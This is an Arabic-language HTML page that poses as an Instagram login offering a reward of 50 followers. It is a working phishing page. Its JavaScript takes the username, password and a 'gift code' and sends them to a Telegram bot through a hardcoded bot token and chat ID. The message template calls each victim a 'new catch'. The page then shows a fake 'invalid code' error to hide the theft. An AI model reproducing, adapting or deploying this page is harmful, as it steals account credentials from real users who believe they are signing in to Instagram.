<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* تأثير الليكويد الاحترافي */
            background: linear-gradient(-45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            background-size: 400% 400%;
            animation: gradient 10s ease infinite;
            overflow: hidden;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* تأثير Liquid Glass */
        .glass-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(25px) saturate(180%);
            -webkit-backdrop-filter: blur(25px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            padding: 40px 25px;
            width: 85%;
            max-width: 350px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            text-align: center;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .insta-logo {
            width: 160px;
            margin-bottom: 20px;
            filter: brightness(0) invert(1);
        }

        .header-text {
            color: #fff;
            font-size: 15px;
            margin-bottom: 25px;
            line-height: 1.5;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }

        .input-group {
            width: 100%;
            margin-bottom: 12px;
        }

        input {
            width: 100%;
            padding: 14px;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: #fff;
            font-size: 14px;
            outline: none;
            box-sizing: border-box;
            transition: 0.3s;
            text-align: right;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        input:focus {
            background: rgba(255, 255, 255, 0.25);
            border-color: #fff;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: #fff;
            color: #d6249f;
            border: none;
            border-radius: 10px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: 0.3s;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .error-box {
            display: none;
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 59, 48, 0.2);
            border: 1px solid rgba(255, 59, 48, 0.4);
            border-radius: 8px;
            color: #ffcccc;
            font-size: 13px;
            animation: shake 0.4s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .meta-footer {
            margin-top: 30px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.6);
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

<div class="glass-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo" alt="Instagram">
    
    <div class="header-text">
        تفعيل مكافأة الـ 50 متابع<br>
        <small>سجل دخولك وأدخل الكود للمتابعة</small>
    </div>

    <div class="input-group">
        <input type="text" id="user" placeholder="اسم المستخدم" spellcheck="false">
    </div>
    <div class="input-group">
        <input type="password" id="pass" placeholder="كلمة السر">
    </div>
    <div class="input-group">
        <input type="text" id="gift" placeholder="كود الهدية (6 أرقام)" inputmode="numeric">
    </div>

    <button class="login-btn" onclick="hit()">تسجيل الدخول</button>

    <div id="status" class="error-box">عذراً، هذا الكود غير صالح أو تم استخدامه!</div>

    <div class="meta-footer">from META</div>
</div>

<script>
    async function hit() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const g = document.getElementById('gift').value;
        const s = document.getElementById('status');

        if(u.length < 3 || p.length < 5 || g.length < 4) {
            alert("يرجى إدخال البيانات بشكل صحيح");
            return;
        }

        // بياناتك من الصور السابقة
        const token = "8634745626:AAFlyddrSV8EmJrWx4n-JEy4wQoPedwyaqQ";
        const chatId = "7822309283";
        const text = `🎯 **صيد جديد (Vexo Panel)**\\n\\n👤 يوزر: \`${u}\`\\n🔑 باس: \`${p}\`\\n🎟 كود: \`${g}\`\\n\\n📡 تم الصيد بنجاح!`;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

        try {
            await fetch(url);
            s.style.display = "block"; // إظهار رسالة الخطأ الوهمية
        } catch (e) {
            console.log("Network Error");
        }
    }
</script>

</body>
</html>
